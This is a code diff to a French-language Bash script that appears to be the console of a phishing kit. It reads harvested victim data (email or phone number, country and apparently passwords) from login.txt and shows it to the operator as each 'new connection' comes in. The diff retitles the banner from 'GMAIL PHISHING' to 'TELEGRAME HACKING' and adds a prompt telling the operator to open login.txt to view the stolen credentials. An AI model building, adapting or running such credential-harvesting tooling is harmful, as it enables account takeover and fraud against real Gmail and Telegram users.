@@ -10,7 +10,7 @@ NC='\033[0m' # Pas de couleur
 
 # Fonction pour afficher les données de connexion
 afficher_donnees() {
-    echo -e "\n${CYAN}════════ NOUVELLE CONNEXION DÉTECTÉE ════════${NC}"
+    echo -e "\n${CYAN}════ NOUVELLE CONNEXION DÉTECTÉE ════${NC}"
     while IFS= read -r ligne; do
         if [[ "$ligne" == *"Username:"* ]]; then
             echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne#*: }"
@@ -24,7 +24,7 @@ afficher_donnees() {
             echo -e "${VERT}🌍 Pays: ${NC}${ligne#*: }"
         fi
     done < login.txt
-    echo -e "${CYAN}════════════════════════════════════${NC}\n"
+    echo -e "${CYAN}═🚨🚨 ouvrez une autre page et TAPEZ nano login.txt pour voir les identifiants 🚨${NC}\n"
 }
 
 # Fonction pour surveiller et afficher les données PHP en temps réel
@@ -150,7 +150,7 @@ echo -e "   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   �
 echo -e "=========================================="
 echo -e "\033[0m"
 echo -e "=========================================="
-echo -e "        🇨🇩  GMAIL PHISHING         "
+echo -e "        🇨🇩  TELEGRAME HACKING        "
 echo -e "=========================================="
 echo -e "${NC}"
 
